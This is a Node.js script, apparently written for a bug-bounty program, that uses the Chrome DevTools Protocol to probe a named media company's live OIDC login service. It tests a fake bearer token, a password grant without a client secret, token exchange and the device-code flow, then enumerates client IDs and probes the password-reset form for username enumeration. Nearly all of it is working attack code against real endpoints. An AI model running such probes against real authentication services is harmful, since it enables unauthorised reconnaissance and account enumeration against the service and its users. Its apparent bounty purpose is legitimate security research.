// humo_oidc_abuse.js — test DPG OIDC endpoints for misconfig via CDP browser.
const http = require('http');
const fs = require('fs');
const path = require('path');

const DIR = path.join(__dirname, '..', 'findings', 'bounties', 'humo-h1');

function getJSON(p) {
  return new Promise((r, j) => {
    http.get({ host: '127.0.0.1', port: 9223, path: p }, c => {
      let d = '';
      c.on('data', x => d += x);
      c.on('end', () => r(JSON.parse(d)));
    }).on('error', j);
  });
}

function cdp(ws, m, p = {}) {
  return new Promise((r, j) => {
    const id = Math.floor(Math.random() * 1e9);
    const t = setTimeout(() => j(new Error('timeout')), 15000);
    const h = evt => {
      const msg = JSON.parse(evt.data);
      if (msg.id === id) { clearTimeout(t); ws.removeEventListener('message', h); msg.error ? j(new Error(JSON.stringify(msg.error))) : r(msg.result); }
    };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id, method: m, params: p }));
  });
}

async function main() {
  const targets = await getJSON('/json');
  let tab = targets.find(t => t.type === 'page');
  const ws = new WebSocket(tab.webSocketDebuggerUrl);
  await new Promise(r => ws.onopen = r);

  await cdp(ws, 'Page.enable');
  await cdp(ws, 'Runtime.enable');
  await cdp(ws, 'Network.enable');

  // Eval that awaits promises inside the page
  const evalAsync = async (expr) => {
    const r = await cdp(ws, 'Runtime.evaluate', {
      expression: `(async () => { ${expr} })()`,
      awaitPromise: true,
      returnByValue: true
    });
    return r.result.value;
  };

  // Test 1: Userinfo with fake Bearer token
  console.log('=== Test 1: /userinfo (fake Bearer) ===');
  const t1 = await evalAsync(`
    const r = await fetch('https://login.dpgmedia.be/userinfo', {
      headers: { 'Authorization': 'Bearer fake_token_12345' }
    });
    return r.status + ': ' + (await r.text()).slice(0, 300);
  `);
  console.log(`  ${t1}`);

  // Test 2: Token endpoint — password grant (no client_secret)
  console.log('\n=== Test 2: /token (password grant, no secret) ===');
  const t2 = await evalAsync(`
    const r = await fetch('https://login.dpgmedia.be/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'grant_type=password&username=test@test.com&password=test&client_id=humo-selectives-web&scope=openid'
    });
    return r.status + ': ' + (await r.text()).slice(0, 300);
  `);
  console.log(`  ${t2}`);

  // Test 3: Token endpoint — token exchange
  console.log('\n=== Test 3: /token (token exchange) ===');
  const t3 = await evalAsync(`
    const r = await fetch('https://login.dpgmedia.be/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=fake&subject_token_type=urn:ietf:params:oauth:token-type:access_token&client_id=humo-selectives-web'
    });
    return r.status + ': ' + (await r.text()).slice(0, 300);
  `);
  console.log(`  ${t3}`);

  // Test 4: Device code flow
  console.log('\n=== Test 4: /device/code ===');
  const t4 = await evalAsync(`
    const r = await fetch('https://login.dpgmedia.be/device/code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'client_id=humo-selectives-web&scope=openid'
    });
    return r.status + ': ' + (await r.text()).slice(0, 500);
  `);
  console.log(`  ${t4}`);

  // Test 5: client_id enumeration via /authorize error messages
  console.log('\n=== Test 5: /authorize client_id enumeration ===');
  const clientIds = ['humo-selectives-web', 'parool-selectives-web', 'volkskrant-selectives-web', 'demorgen-selectives-web', 'test', 'admin', 'nonexistent-client'];
  for (const cid of clientIds) {
    await cdp(ws, 'Page.navigate', {
      url: `https://login.dpgmedia.be/authorize?client_id=${cid}&response_type=code&scope=openid&redirect_uri=https://example.com`
    });
    await new Promise(r => setTimeout(r, 3000));
    const evalS = async (expr) => {
      const r = await cdp(ws, 'Runtime.evaluate', { expression: expr, returnByValue: true });
      return r.result.value;
    };
    const title = await evalS('document.title');
    const body = await evalS('document.body ? document.body.innerText.slice(0,200) : ""');
    console.log(`  ${cid}: title="${title}" body="${(body||'').replace(/\n/g,' ').slice(0,120)}"`);
    await new Promise(r => setTimeout(r, 1500));
  }

  // Test 6: Password reset — username enumeration via response difference
  console.log('\n=== Test 6: Password reset enumeration ===');
  // Navigate to password reset
  await cdp(ws, 'Page.navigate', {
    url: 'https://login.dpgmedia.be/password/reset?client_id=humo-selectives-web'
  });
  await new Promise(r => setTimeout(r, 4000));

  // Submit with a definitely-fake email and observe response
  const t6 = await evalAsync(`
    const form = document.querySelector('form');
    if (!form) return 'no form';
    const input = form.querySelector('input[name="uname"]');
    if (input) {
      // Set value via native setter to trigger any JS handlers
      const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      nativeInputValueSetter.call(input, 'definitely-fake-99999@nonexistent.invalid');
      input.dispatchEvent(new Event('input', { bubbles: true }));
      input.dispatchEvent(new Event('change', { bubbles: true }));
    }
    const btn = form.querySelector('button');
    if (btn) btn.click();
    // Wait for response
    await new Promise(r => setTimeout(r, 4000));
    return document.title + ' | ' + document.body.innerText.slice(0, 500);
  `);
  console.log(`  fake email response: ${(t6 || '').slice(0, 300)}`);

  // Summary
  const results = { t1, t2, t3, t4, timestamp: new Date().toISOString() };
  fs.writeFileSync(path.join(DIR, 'oidc_abuse_results.json'), JSON.stringify(results, null, 2));
  console.log('\n=== Results saved ===');

  ws.close();
}

main().catch(e => { console.error(e); process.exit(1); });
